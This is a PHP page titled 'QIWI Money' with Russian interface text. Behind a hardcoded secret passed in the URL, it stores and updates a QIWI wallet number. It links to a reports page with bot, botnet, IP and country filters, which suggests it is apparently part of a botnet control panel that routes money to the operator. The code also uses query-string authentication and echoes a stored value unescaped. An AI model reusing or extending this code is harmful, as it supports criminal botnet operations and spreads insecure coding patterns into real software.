<html>
    <head>  
    
    <meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  
 <title>QIWI Money</title>
    
     <style type="text/css"> html, body {
     background: #ffffff; 
     background-attachment: fixed; 
     background-repeat: no-repeat; 
     background-position: top center;}

       </style>
     
    </head>
 <body>
  <div align="left" ><img src="images/qiwi.png" width=240 /></div>
<br>
<?php
$result='';
if($_GET['login']==="veryverysexyqiwiii")
{

include('system/config.php');
mysql_connect($config['mysql_host'], $config['mysql_user'], $config['mysql_pass']) or die("LOL"); 
mysql_select_db($config['mysql_db']) or die("LOL");
    if(empty($_POST))
	    {
	    
		    if(isset($_GET['ok']))
	            {
		            $result = "Кошелёк обновлен!";	
		        }
		    if(isset($_GET['error']))
	            {
		            $result = "Длина кошелька не верная.";	
		        }
		    $sql_qw = "SELECT `qw` FROM `qiwi` WHERE 1";
			$sql_qw_go = mysql_query($sql_qw);
			$qw_array = mysql_fetch_row($sql_qw_go);
			if($qw_array === false )
			    {
				    $qw = "1234567890";
					
				    $pre_qw = "INSERT INTO `qiwi` (`qw`) VALUES ('$qw')";
					$pre_qw_go = mysql_query($pre_qw);
				}
			    else
				{
				    $qw = $qw_array[0];
				}


		    $form = "
			         <form method='post' action='qw.php?login=veryverysexyqiwiii'> 
			      
					<font color='#000000'><b>Номер счёта:</b></font>
					 <input type='text' name='qw' size='10' maxlength='10' value='$qw'>
					 <br><br>
					 <input name='Submit' type=submit size='width:100px' value='Сохранить'>
					 <br>
			         <div><font color='#00000'>$result</font></div>
			         
			         
                     </form>";
                   
			echo $form;
		}
		else
		{		
		    $sql_qw = "SELECT `qw` FROM `qiwi` WHERE 1";
			$sql_qw_go = mysql_query($sql_qw);
			$qw_array = mysql_fetch_row($sql_qw_go);
            $qw_do = $qw_array[0];			
		
		 
		    $qw = mysql_real_escape_string($_POST['qw']);
			
			if(strlen($qw) === 10)
			    {
				}
				else
				{
					 header("Location: qw.php?login=veryverysexyqiwiii&error=1");
					 exit;
				}
			
				
			$up_qw = "UPDATE `qiwi` SET `qw`='$qw' WHERE  `qw`='$qw_do'  LIMIT 1;";
			$up_go = mysql_query($up_qw);
			header("Location: qw.php?login=veryverysexyqiwiii&ok=1");
		}
		
}
else{echo "<font color='red'><b>Не авторизирован</b></font>", "<BR>","<BR>","<BR>" ;}
?>
<br><br>
<div align="left" ><img src="images/qiwichk.png" width=240 /></div>
<br>
<div align="left" ><a href="mtanqste.php?rm=0&m=reports_db&date1=010112&date2=121213&bots=&botnets=&ips=&countries=&q=<?php echo $qw; ?>&blt=0" target="blank"><img src="images/qw.png" ><font color='#000000'><b>Check QIWI</b></font></a></div>

</body>
</html>
